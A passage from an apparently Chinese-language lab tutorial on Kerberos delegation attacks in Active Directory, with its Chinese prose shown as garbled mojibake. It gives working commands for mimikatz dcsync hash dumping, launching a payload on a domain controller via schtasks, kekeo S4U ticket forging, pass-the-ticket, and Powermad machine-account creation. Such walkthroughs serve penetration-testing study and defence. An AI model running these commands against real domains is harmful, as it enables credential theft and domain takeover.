¼ï¼Œä¸”è¯¥ç¥¨å¹¶ä¸æ˜¯é»„é‡‘ç™½é“¶ç¥¨æ®ï¼Œä¸èƒ½è®¿é—®DCçš„æ–‡ä»¶</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨è¯¥ç¥¨æ®é€šè¿‡mimikatzè·å–ä¸ç”¨æˆ·çš„hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /all /csv</span><br></pre></td></tr></table></figure></li><li><p>å¾—åˆ°ä¸ç”¨æˆ·çš„NTLM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">krbtgtç”¨æˆ·çš„NTLMå¯ä»¥åˆ¶ä½œé»„é‡‘ç¥¨æ®</span><br><span class="line">Administratorçš„NTLMå¯ä»¥è¿›è¡Œhashä¼ é€’çš„PTHæ”»å‡»</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœåˆ¶ä½œé»„é‡‘ç¥¨æ®ï¼Œå¯ä»¥åˆ©ç”¨è®¡åˆ’ä»»åŠ¡ç­‰ä¸Šçº¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy 123.exe \\dc.hack.com\C$</span><br><span class="line">shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\123.exe /ru</span><br><span class="line">system /f</span><br><span class="line">shell schtasks /run /s dc.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure></li></ol><h2 id="4ã€æ„é€ æœåŠ¡è´¦æˆ·ç¥¨æ®æ§åˆ¶åŸŸæ§"><a href="#4ã€æ„é€ æœåŠ¡è´¦æˆ·ç¥¨æ®æ§åˆ¶åŸŸæ§" class="headerlink" title="4ã€æ„é€ æœåŠ¡è´¦æˆ·ç¥¨æ®æ§åˆ¶åŸŸæ§"></a>4ã€æ„é€ æœåŠ¡è´¦æˆ·ç¥¨æ®æ§åˆ¶åŸŸæ§</h2><h3 id="1ã€å®éªŒå‰æ"><a href="#1ã€å®éªŒå‰æ" class="headerlink" title="1ã€å®éªŒå‰æ"></a>1ã€å®éªŒå‰æ</h3><ol><li><p>æœåŠ¡è´¦æˆ·è®¾ç½®äº†éçº¦æŸæ€§å§”æ´¾</p></li><li><p>å·²çŸ¥æœåŠ¡è´¦æˆ·çš„å¯†ç å£ä»¤ä¿¡æ¯</p></li></ol><h3 id="2ã€å®éªŒæ­¥éª¤-1"><a href="#2ã€å®éªŒæ­¥éª¤-1" class="headerlink" title="2ã€å®éªŒæ­¥éª¤"></a>2ã€å®éªŒæ­¥éª¤</h3><ol><li><p>ä½¿ç”¨ adfifindå‘ç°æœåŠ¡è´¦å·testè®¾ç½®äº†éçº¦æŸå§”æ´¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)</span><br><span class="line">(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E7%94%A8%E6%88%B7.png"></p></li><li><p>æ„é€ æœåŠ¡è´¦æˆ·TGTçš„ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:test /domain:hack.com /password:Admin@123</span><br><span class="line">/ticket:test.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨åˆšæ‰ä¼ªé€ çš„TGTç¥¨æ®ï¼Œå‘åŸŸæœåŠ¡å™¨ç”³è¯·CIFSæœåŠ¡ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;Tgs::s4u /tgt:TGT_test@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi</span><br><span class="line">/user:administrator@hack.com /service:cifs/DC.HACK.COM&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨mimikatzå°†è¯¥ç¥¨æ®æ³¨å…¥å½“å‰çš„ä¼šè¯ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge    #å…ˆæ¸…ç©ºç¥¨æ®</span><br><span class="line">mimikatz kerberos::ptt TGS_administrator@hack.com@HACK.COM_test@HACK.COM.kirbi</span><br></pre></td></tr></table></figure></li><li><p>è®¿é—®åŸŸæ§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\dc.hack.com\c$</span><br></pre></td></tr></table></figure></li></ol><h1 id="ä¸‰ã€çº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#ä¸‰ã€çº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="ä¸‰ã€çº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>ä¸‰ã€çº¦æŸæ€§å§”æ´¾æ”»å‡»</h1><h2 id="1ã€æ·»åŠ çº¦æŸæ€§å§”æ´¾"><a href="#1ã€æ·»åŠ çº¦æŸæ€§å§”æ´¾" class="headerlink" title="1ã€æ·»åŠ çº¦æŸæ€§å§”æ´¾"></a>1ã€æ·»åŠ çº¦æŸæ€§å§”æ´¾</h2><p><img src="/img/Intranet-Penetration-Delegation-attack/%E6%B7%BB%E5%8A%A0%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE.png"></p><h2 id="2ã€æŸ¥è¯¢çº¦æŸæ€§å§”æ´¾æœºå™¨å’Œç”¨æˆ·ä¿¡æ¯"><a href="#2ã€æŸ¥è¯¢çº¦æŸæ€§å§”æ´¾æœºå™¨å’Œç”¨æˆ·ä¿¡æ¯" class="headerlink" title="2ã€æŸ¥è¯¢çº¦æŸæ€§å§”æ´¾æœºå™¨å’Œç”¨æˆ·ä¿¡æ¯"></a>2ã€æŸ¥è¯¢çº¦æŸæ€§å§”æ´¾æœºå™¨å’Œç”¨æˆ·ä¿¡æ¯</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//éœ€è¦åŸŸç”¨æˆ·æƒé™</span><br><span class="line">æŸ¥è¯¢çº¦æŸå§”æ´¾æœºå™¨è´¦æˆ·ï¼š</span><br><span class="line">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br><span class="line">æŸ¥è¯¢çº¦æŸå§”æ´¾æœåŠ¡è´¦æˆ·</span><br><span class="line">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%99%A8%E6%9F%A5%E8%AF%A2.png"></p><p>è‡³æ­¤é™åˆ¶äº†æˆ‘ä»¬åªèƒ½æ‰“DCè¿™ä¸€å°æœºå™¨ï¼Œä¸”åªèƒ½è®¿é—®cifsæœåŠ¡ï¼Œä¸èƒ½è®¿é—®å…¶ä»–æœåŠ¡ï¼Œæ— æ³•ä¸Šä¼ æœ¨é©¬ä¸Šçº¿ã€‚</p><h2 id="2ã€å®éªŒåœºæ™¯"><a href="#2ã€å®éªŒåœºæ™¯" class="headerlink" title="2ã€å®éªŒåœºæ™¯"></a>2ã€å®éªŒåœºæ™¯</h2><p><img src="/img/Intranet-Penetration-Delegation-attack/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%AE%9E%E9%AA%8C%E5%9C%BA%E6%99%AF.png"></p><p>å®éªŒå‰æï¼šæˆ‘ä»¬å·²ç»æ§åˆ¶äº†ZSçš„ç”µè„‘ï¼Œå‘ç°è¯¥ç”µè„‘é…ç½®äº†çº¦æŸæ€§çš„å§”æ´¾ï¼Œå¹¶ä¸”å¯ä»¥è¯»å–åˆ°è¯¥ç”µè„‘çš„æœºå™¨ç”¨æˆ·çš„HASHå€¼ã€‚</p><h2 id="3ã€å®éªŒæ­¥éª¤-1"><a href="#3ã€å®éªŒæ­¥éª¤-1" class="headerlink" title="3ã€å®éªŒæ­¥éª¤"></a>3ã€å®éªŒæ­¥éª¤</h2><ol start="2"><li><p>ä½¿ç”¨mimikatzè·å–æœ¬åœ°æœºå™¨è´¦æˆ·æœ‰çº¦æŸæ€§å§”æ´¾æƒé™çš„NTLM Hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨kekeoç”³è¯·é…ç½®äº†çº¦æŸå§”æ´¾æœºå™¨è´¦æˆ·PC-ZS$çš„TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:PC-ZS$ /NTLM:bd41aace231471169d848817a2c46178 /domain:hack.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨TGTé€šè¿‡ä¼ªé€ S4Uè¯·æ±‚ä»¥administratorèº«ä»½è®¿é—®PC-ZSçš„ST</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_PC-ZS$@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi</span><br><span class="line">/user:Administrator@hack.com /service:cifs/dc.hack.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></li><li><p>æ³¨å…¥ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge    #å…ˆæ¸…ç©ºç¥¨æ®</span><br><span class="line">mimikatz kerberos::ptt</span><br><span class="line">TGS_Administrator@hack.com@HACK.COM_cifs~dc.hack.com@HACK.COM.kirbi</span><br></pre></td></tr></table></figure></li><li><p>è®¿é—®åŸŸæ§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\dc.hack.com\C$</span><br><span class="line">//æ³¨æ„ï¼Œæ­¤æ—¶åªæœ‰CIFSæ–‡ä»¶å…±äº«æœåŠ¡ç¥¨æ®ï¼Œæ²¡æœ‰hostæœåŠ¡ç¥¨æ®ç¥¨æ®ã€‚</span><br></pre></td></tr></table></figure></li></ol><h1 id="å››ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#å››ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="å››ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>å››ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æ”»å‡»</h1><h2 id="ä¸€ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ä»‹ç»"><a href="#ä¸€ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ä»‹ç»" class="headerlink" title="ä¸€ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ä»‹ç»"></a>ä¸€ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ä»‹ç»</h2><p><strong>åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ï¼š</strong>ä¸ºäº†ä½¿â½¤æˆ·&#x2F;èµ„æºæ›´åŠ ç‹¬â½´ï¼Œå¾®è½¯åœ¨Windows Server 2012ä¸­å¼•â¼Šäº†åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ä¸éœ€è¦åŸŸç®¡ç†å‘˜æƒé™å»è®¾ç½®ç›¸å…³å±æ€§ï¼Œâ½½æ˜¯å°†è®¾ç½®å§”æ´¾çš„æƒé™äº¤ç»™äº†æœåŠ¡æœºå™¨ã€‚æœåŠ¡æœºå™¨åœ¨è‡ªå·±è´¦æˆ·ä¸Šé…ç½®msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ï¼Œå°±å¯ä»¥è¿›è¡ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ã€‚</p><p>2008 åŠä»¥ä¸‹çš„åŸŸæ§æ²¡æœ‰ msDS-AllowedToActOnBehalfOfOtherIdentity è¿™ä¸ªå±æ€§ï¼Œåªæœ‰ Windows Server 2012 å’Œ Windows Server 2012 R2 åŠä»¥ä¸Šçš„åŸŸæ§åˆ¶å™¨æ‰æœ‰ msDS-AllowedToActOnBehalfOfOtherIdentity è¿™ä¸ªå±æ€§</p><h2 id="äºŒã€æ”»å‡»å‰æ"><a href="#äºŒã€æ”»å‡»å‰æ" class="headerlink" title="äºŒã€æ”»å‡»å‰æ"></a>äºŒã€æ”»å‡»å‰æ</h2><ol><li>å…·æœ‰å¯¹ä¸»æœºä¿®æ”¹<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>å±æ€§çš„æƒé™</li><li>å¯ä»¥åˆ›å»ºæœºå™¨è´¦æˆ·ï¼ˆæˆ–å·²çŸ¥æœºå™¨è´¦æˆ·ï¼‰</li></ol><p>ä»€ä¹ˆç”¨æˆ·å…·å¤‡ä¿®æ”¹<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>å±æ€§çš„æƒé™å‘¢ï¼Ÿ</p><ol><li>å°†è¯¥ä¸»æœºåŠ å…¥åŸŸçš„ç”¨æˆ·è´¦æˆ·<br>è´¦æˆ·ä¸­æœ‰ä¸€ä¸ª<code>mSDS-CreatorSID</code>å±æ€§ï¼Œç”¨äºæ ‡è®°åŠ å…¥åŸŸæ—¶ä½¿ç”¨çš„ç”¨æˆ·è´¦æˆ·SIDå€¼ï¼Œè¿›ä¸€æ­¥å°±å¯ä»¥çŸ¥é“ä¸€äº›å…·æœ‰åŠ å…¥åŸŸæƒé™çš„ç”¨æˆ·è´¦æˆ·äº†ï¼</li><li>Account Operatorç»„æˆå‘˜</li><li>è¯¥ä¸»æœºçš„æœºå™¨è´¦æˆ·</li></ol><p>è°å¯ä»¥åˆ›å»ºæœºå™¨è´¦æˆ·å‘¢ï¼Ÿ</p><p>å¯¹äºä¸€èˆ¬åŸŸæˆå‘˜ï¼Œç”±<code>msDS-MachineAccountQuota</code>ï¼ˆå¯ä»¥åœ¨åŸŸæ§ï¼‰å±æ€§å†³å®šï¼Œé»˜è®¤å¯ä»¥åˆ›å»º10ä¸ªæœºå™¨è´¦æˆ·ã€‚</p><p>å¯ä»¥åœ¨åŸŸæ§ä¸­è¾“å…¥<code> adsiedit.msc</code>ï¼ˆADSIç¼–è¾‘å™¨ï¼‰ä¸­å³å‡»-â€œè¿æ¥åˆ°â€-ç‚¹å‡»ç¡®å®šï¼Œå³é”® â€œDC&#x3D;xxx DC&#x3D;â€comâ€ å•å‡»â€œå±æ€§â€ï¼Œ<code>ms-DS-MachineAccountQuota</code>å±æ€§å€¼ä¸º10ï¼Œè¯´æ˜äº†ä¸€ä¸ªæ™®é€šçš„åŸŸç”¨æˆ·å¯ä»¥å°†10å°ä¸»æœºåŠ å…¥åˆ°åŸŸ</p><h2 id="ä¸‰ã€ç¯å¢ƒé…ç½®"><a href="#ä¸‰ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸‰ã€ç¯å¢ƒé…ç½®"></a>ä¸‰ã€ç¯å¢ƒé…ç½®</h2><p>åŸŸï¼šgod.org</p><ul><li>åŸŸæ§ï¼š192.168.31.58ï¼ˆWindows server 2012ï¼‰</li><li>stu1ä¸»æœºï¼š192.168.31.52ï¼ˆwin7åŸŸæœºå™¨ï¼‰</li></ul><p>1ã€æ–°å»ºä¸€ä¸ªæ™®é€šåŸŸç”¨æˆ·<code>test</code></p><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319163113791.png" alt="image-20240319163113791"></p><p>2ã€å°†ä¹‹å‰åŠ å…¥åŸŸçš„win7é€€å‡ºåŸŸï¼Œä¿®æ”¹è®¡ç®—æœºåï¼Œä½¿ç”¨æ™®é€šåŸŸç”¨æˆ·<code>test</code>å†åŠ å…¥åŸŸ</p><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319163700794.png" alt="image-20240319163700794"></p><p>é‡å¯è®¡ç®—æœºï¼ŒæˆåŠŸåŠ å…¥åŸŸ<code>god.org</code>ï¼Œå¹¶ä½¿ç”¨test åŸŸç”¨æˆ·è¿›å…¥è®¡ç®—æœº</p><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319163808774.png" alt="image-20240319163808774"></p><h2 id="å››ã€ç›®æ ‡æŸ¥è¯¢"><a href="#å››ã€ç›®æ ‡æŸ¥è¯¢" class="headerlink" title="å››ã€ç›®æ ‡æŸ¥è¯¢"></a>å››ã€ç›®æ ‡æŸ¥è¯¢</h2><p>ä¸ºäº†å®éªŒçœŸå®ï¼Œç›´æ¥ç”¨csæ¥æ“ä½œ</p><p>æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319164805983.png" alt="image-20240319164805983"></p><p>å¯ä»¥çœ‹åˆ°<code>test</code>ç”¨æˆ·ä¸åœ¨æœ¬åœ°ç®¡ç†å‘˜ç»„ä¸­ï¼Œ<code>test</code>ç”¨æˆ·è´Ÿè´£å°†<code>stu2</code>æœºå™¨åŠ å…¥åˆ°åŸŸä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‹¿åˆ°è¿™ä¸ª<code>test</code>ç”¨æˆ·æƒé™ä¹‹åï¼Œå°±å¯ä»¥æ‹¿ä¸‹åŸŸå†…<code>stu2</code>æˆ–å…¶ä»–è¢«<code>test</code>ç”¨æˆ·åŠ å…¥åˆ°åŸŸå†…çš„æœºå™¨</p><h3 id="1ã€æ ¸å¿ƒç›®æ ‡æŸ¥è¯¢ï¼ˆç”±æœºå™¨æ‰¾åˆ°å¯¹åº”çš„ç”¨æˆ·ï¼‰"><a href="#1ã€æ ¸å¿ƒç›®æ ‡æŸ¥è¯¢ï¼ˆç”±æœºå™¨æ‰¾åˆ°å¯¹åº”çš„ç”¨æˆ·ï¼‰" class="headerlink" title="1ã€æ ¸å¿ƒç›®æ ‡æŸ¥è¯¢ï¼ˆç”±æœºå™¨æ‰¾åˆ°å¯¹åº”çš„ç”¨æˆ·ï¼‰"></a>1ã€æ ¸å¿ƒç›®æ ‡æŸ¥è¯¢ï¼ˆç”±æœºå™¨æ‰¾åˆ°å¯¹åº”çš„ç”¨æˆ·ï¼‰</h3><p><strong>æ ¸å¿ƒç›®æ ‡ï¼šæ‰¾åˆ°å¯ä¿®æ”¹è¯¥æœºå™¨msDS-AllowedToActOnBehalfOfOtherIdentityçš„ç”¨æˆ·</strong>ï¼Œä¹Ÿå°±æ˜¯æŸ¥è¯¢æœºå™¨æ˜¯ç”±å“ªä¸ªåŸŸç”¨æˆ·æ·»åŠ è¿›åŸŸçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//é€šè¿‡adfind.exeæŸ¥æ‰¾æœºå™¨è´¦æˆ·çš„mS-DS-CreatorSIDå±æ€§</span><br><span class="line">AdFind.exe -h 192.168.10.2 -u yu -up yu.com -b &quot;DC=test,DC=lab&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br><span class="line"></span><br><span class="line">//ç›¸å…³å‚æ•°è®²è§£ï¼š</span><br><span class="line">-hï¼šæ¥åŸŸæ§åˆ¶å™¨çš„IP</span><br><span class="line">-uï¼šæ¥ç”¨äºåˆå§‹ç»‘å®šåˆ°åŸŸæ§åˆ¶å™¨çš„ç”¨æˆ·å</span><br><span class="line">-upï¼šæ¥ç”¨æˆ·çš„å¯†ç </span><br><span class="line">-bï¼šæ¥åŸŸçš„åç§°</span><br><span class="line">-fï¼šæ¥LDAPè¿‡æ»¤æ¡ä»¶ï¼Œæ‰§è¡Œæœç´¢çš„å¯¹è±¡ç±»åˆ«ï¼Œåœ¨è¿™é‡Œæ˜¯computerï¼Œå³æ‰€æœ‰è®¡ç®—æœºè´¦æˆ·</span><br><span class="line">mS-DS-CreatorSIDï¼šæ˜¯è¦æ£€ç´¢åˆ›å»ºè®¡ç®—æœºè´¦æˆ·æ—¶æ‰€ä½¿ç”¨çš„ç”¨æˆ·å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆSIDï¼‰</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319170857449.png" alt="image-20240319170857449"></p><p>æˆ‘ä»¬çŸ¥é“å°†æœºå™¨åŠ å…¥åˆ°åŸŸçš„åŸŸç”¨æˆ·SIDå€¼ï¼Œå´ä¸çŸ¥é“å¯¹åº”çš„ç”¨æˆ·å</p><p>æŸ¥è¯¢SIDçš„æ–¹æ³•æœ‰å¾ˆå¤š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//1ã€æŸ¥è¯¢å½“å‰ç”¨æˆ·çš„SIDå€¼</span><br><span class="line">whoami /user</span><br><span class="line"></span><br><span class="line">//2ã€åŸŸç”¨æˆ·å¯ä»¥åˆ©ç”¨wmicæŸ¥è¯¢åŸŸå†…æ‰€æœ‰è´¦æˆ·çš„SIDå€¼</span><br><span class="line">wmic useraccount get /all | findstr &lt;SIDå€¼&gt;</span><br><span class="line"></span><br><span class="line">//3ã€ä½¿ç”¨PowershellåæŸ¥SIDå¯¹åº”çš„ç”¨æˆ·</span><br><span class="line">powerpick $objSID = New-Object System.Security.Principal.SecurityIdentifier &lt;SIDå€¼&gt;;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319171959713.png" alt="image-20240319171959713"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¯¥SIDå€¼å¯¹åº”çš„æ­£å¥½æ˜¯å½“å‰ç”¨æˆ·<code>test</code></p><h3 id="1ã€æ ¸å¿ƒç›®æ ‡æŸ¥è¯¢ï¼ˆç”±å½“å‰ç”¨æˆ·æ‰¾åˆ°å¯¹åº”çš„æœºå™¨ï¼‰"><a href="#1ã€æ ¸å¿ƒç›®æ ‡æŸ¥è¯¢ï¼ˆç”±å½“å‰ç”¨æˆ·æ‰¾åˆ°å¯¹åº”çš„æœºå™¨ï¼‰" class="headerlink" title="1ã€æ ¸å¿ƒç›®æ ‡æŸ¥è¯¢ï¼ˆç”±å½“å‰ç”¨æˆ·æ‰¾åˆ°å¯¹åº”çš„æœºå™¨ï¼‰"></a>1ã€æ ¸å¿ƒç›®æ ‡æŸ¥è¯¢ï¼ˆç”±å½“å‰ç”¨æˆ·æ‰¾åˆ°å¯¹åº”çš„æœºå™¨ï¼‰</h3><p><strong>æ ¸å¿ƒç›®æ ‡ï¼šç”±å·²çŸ¥ç”¨æˆ·æŸ¥æ‰¾åˆ°é€šè¿‡è¯¥ç”¨æˆ·åŠ å…¥åŸŸä¸­çš„æœºå™¨</strong>ï¼Œéœ€è¦ä½¿ç”¨<code>PowerView.ps1</code>å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥ç”¨æˆ·è´¦æˆ·SID</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨PowerViewæŸ¥ç»ç”±è¯¥ç”¨æˆ·åŠ å…¥åŸŸå†…çš„æœºå™¨è´¦æˆ·(ä¸»æœº)</span><br><span class="line"># éœ€è¦å…·å¤‡GeneriCallæˆ–WritePropertyç­‰ä¿®æ”¹æƒé™</span><br><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">powershell-import PowerView.ps1ï¼ˆä¸è®ºæŠ¥é”™ï¼‰</span><br><span class="line">powerpick Get-DomainObjectAcl | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-3309395417-4108617856-2168433834-1104&quot;&#125; | select objectdn,activedirectoryrights</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319210053534.png" alt="image-20240319210053534"></p><h2 id="äº”ã€æ”»å‡»åˆ©ç”¨"><a href="#äº”ã€æ”»å‡»åˆ©ç”¨" class="headerlink" title="äº”ã€æ”»å‡»åˆ©ç”¨"></a>äº”ã€æ”»å‡»åˆ©ç”¨</h2><h3 id="1ã€æ”»å‡»æ–¹å¼1ï¼šä¿®æ”¹å§”æ´¾å±æ€§æ‹¿ä¸‹ä¸»æœº"><a href="#1ã€æ”»å‡»æ–¹å¼1ï¼šä¿®æ”¹å§”æ´¾å±æ€§æ‹¿ä¸‹ä¸»æœº" class="headerlink" title="1ã€æ”»å‡»æ–¹å¼1ï¼šä¿®æ”¹å§”æ´¾å±æ€§æ‹¿ä¸‹ä¸»æœº"></a>1ã€æ”»å‡»æ–¹å¼1ï¼šä¿®æ”¹å§”æ´¾å±æ€§æ‹¿ä¸‹ä¸»æœº</h3><p><strong>å…³é”®ï¼šèƒ½ä¿®æ”¹é‚£å°æœåŠ¡èµ„æºçš„å§”æ´¾å±æ€§ï¼Œå°±å¯ä»¥æ‹¿ä¸‹è¯¥å°ä¸»æœº</strong></p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>å…è®¸åˆ›å»ºæœºå™¨è´¦æˆ·</li><li>å…·æœ‰ç®¡ç†ä¸»æœºåŠ å…¥åŸŸçš„ç”¨æˆ·è´¦æˆ·</li></ol><h4 id="1ã€æ·»åŠ æœºå™¨è´¦æˆ·"><a href="#1ã€æ·»åŠ æœºå™¨è´¦æˆ·" class="headerlink" title="1ã€æ·»åŠ æœºå™¨è´¦æˆ·"></a>1ã€æ·»åŠ æœºå™¨è´¦æˆ·</h4><p><strong>æ–¹æ³•ä¸€ï¼šåˆ©ç”¨powermad æ·»åŠ æœºå™¨è´¦æˆ·</strong></p><p>ç”¨åˆ°<a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">Powermad.ps1</a> è„šæœ¬ï¼Œå¾€åŸŸä¸­æ·»åŠ ä¸€ä¸ªæœºå™¨è´¦æˆ·<code>test1$</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test1 -Password $(ConvertTo-SecureString &quot;Admin@12345&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨cs ä¸­æ‰§è¡Œå¤±è´¥ï¼Œæ¨æµ‹åº”è¯¥ä½¿ç”¨msf ç±»å‹çš„äº¤äº’å¼powershellæ‰§è¡Œã€‚ä¸è¿‡ä½œä¸ºç»ƒä¹ ï¼Œå¯ä»¥ç›´æ¥åœ¨é¶æœºä¸­æ‰§è¡Œï¼Œå°†ä¼šæ‰§è¡ŒæˆåŠŸã€‚</p><p>æ­¤æ—¶å°±æœ‰äº†â¼€ä¸ªåŸŸæœºå™¨è´¦æˆ·<code>test1$</code>ï¼Œé€šè¿‡<code>net group &quot;domain computers&quot; /domain</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹åˆ°</p><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319174325921.png" alt="image-20240319174325921"></p><p><strong>æ–¹æ³•äºŒï¼š</strong>åˆ©ç”¨Sharpmadå·¥å…·æ·»åŠ æœºå™¨ç”¨æˆ·</p><p>ç”¨åˆ°<a href="https://github.com/Kevin-Robertson/Sharpmad">Sharpmad</a>å·¥å…·ï¼ŒPowermad çš„ C# 